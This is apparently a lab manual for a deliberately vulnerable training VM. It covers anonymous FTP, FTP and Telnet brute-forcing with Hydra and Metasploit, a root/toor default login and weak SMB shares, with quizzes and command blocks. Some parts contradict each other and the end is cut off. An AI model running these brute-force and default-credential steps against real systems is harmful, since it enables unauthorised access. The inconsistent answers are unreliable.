
Welcome to the official lab manual for **HALUV** – a custom vulnerable virtual machine designed for wireless network penetration testing. Each lab targets a specific misconfiguration or vulnerability intentionally set in the VM.

---

## 📁 Lab 1: FTP Anonymous Login

**Objective**: Exploit anonymous access enabled on the vsftpd service.

### ✅ Learning Objectives
- Understand anonymous FTP configuration
- Discover services using Nmap
- Use command-line FTP client
- Identify file exposure risk
- Retrieve a hidden flag

### ❓ Multiple Choice Questions

1. What port does FTP typically run on?
   - A. 21 ✅
   - B. 23
   - C. 22
   - D. 80

2. Which username is typically used for anonymous access?
   - A. admin
   - B. root
   - C. anonymous ✅
   - D. ftpuser

3. What is a risk of allowing anonymous FTP access?
   - A. Port scanning
   - B. Data leakage ✅
   - C. DNS hijacking
   - D. DoS attacks

4. Which tool connects to FTP from the terminal?
   - A. ssh
   - B. telnet
   - C. ftp ✅
   - D. curl

5. What format does HALUV use for flags?
   - A. WIN[]
   - B. FLAG{} ✅
   - C. [KEY]
   - D. CTL==

### 🔍 Scanning Instructions

```bash
nmap -sV -p 21 <target-ip>
ftp <target-ip>
```

### 💥 Exploitation Steps

```bash
ftp <target-ip>
# Login as 'anonymous', press Enter for password
ls
get flag.txt
```

---

## 📁 Lab 2: FTP Weak Credentials

**Objective**: Brute-force weak FTP login credentials and access protected content.

### ✅ Learning Objectives
- Use msfconsole to brute-force login
- Understand risk of weak passwords
- Interact with FTP service securely
- Download captured flag

### ❓ Multiple Choice Questions

1. Which tool is used for brute-forcing FTP logins?
   - A. Wireshark
   - B. Hydra ✅
   - C. Metasploit
   - D. Netcat

2. What’s an example of a weak password?
   - A. R@nd0mPass!
   - B. 12345 ✅
   - C. Z!xQw87
   - D. 2FAonly

3. Which command invokes Hydra for FTP?
   - A. hydra -l user -P passlist.txt ftp://IP ✅
   - B. hydra -f IP
   - C. hydra -ssh IP
   - D. hydra -F ftp IP

4. What should you check after logging in?
   - A. /root/
   - B. /home/ftpuser/ftp/upload ✅
   - C. /etc/
   - D. /srv/share

5. What is the flag retrieval indicator?
   - A. Download complete
   - B. cat /etc/passwd
   - C. get flag.txt ✅
   - D. login root

```bash
msfconsole
Then in the console:
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target-ip>
set USERNAME ftpuser
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

## 📁 Lab 3: Telnet Default Password

**Objective**: Connect to a Telnet service using default credentials.

### ❓ Multiple Choice Questions

1. What port does Telnet run on?
   - A. 22
   - B. 23 ✅
   - C. 25
   - D. 443

2. Is Telnet secure by default?
   - A. Yes
   - B. No ✅

3. Which tool can brute-force Telnet?
   - A. John
   - B. Hydra ✅
   - C. Netcat
   - D. Gophish

4. Which command opens a Telnet session?
   - A. ssh
   - B. telnet ✅
   - C. ftp
   - D. netstat

5. Where is the flag usually stored?
   - A. /tmp/
   - B. /etc/
   - C. /root/flag.txt ✅
   - D. /mnt/

### 🔍 Scanning Instructions

```bash
nmap -p 23 <target-ip>
hydra -l root -P /usr/share/wordlists/rockyou.txt telnet://<target-ip>
```

### 💥 Exploitation Steps

```bash
telnet <target-ip>
# Login: root
# Password: toor
cat /root/flag.txt
```

---

## 📁 Lab 4: SMB Weak Share

**Objective**: Access a misconfigured Samba share with weak or guest credentials.

### ❓ Multiple Choice Questions

1. What port does SMB run on?
   - A. 80
   - B. 445 ✅
   - C. 139
   - D. 110

2. What is used to access SMB from Linux?
   - A. smbclient ✅
   - B. ftp
   - C. curl
   - D. telnet

3. What credentials pose high risk?
   - A. Multi-factor
   - B. Default or guest ✅
   - C. Encrypted
   - D. Public key

4. What command lists SMB shares?
   - A. smbmap
   - B. smbclient -L //<IP>/ ✅
   - C. enum4linux -S
   - D. showmount

5. Where do you typically find SMB flags?
   - A. /tmp/hidden
   - B. /srv/samba/share/flag.txt ✅
   - C. /home/root/
   - D. /etc/smb.conf

### 🔍 Scanning Instructions

```bash
nmap -p 445 --script smb-enum-shares <target-ip>
smbclient -L //<target-ip>/ -U smbuser%12345
```

### 💥 Exploitation Steps

```bash
smbclient //<target-ip>/weakshare -U smbuser%12345
cd share
get flag.txt
```

---



Stay tuned for advanced guides in the next release.

---

© 2025 HALUV Project | All rights reserved.ng HALUV_GitHub_Labs.md…]()
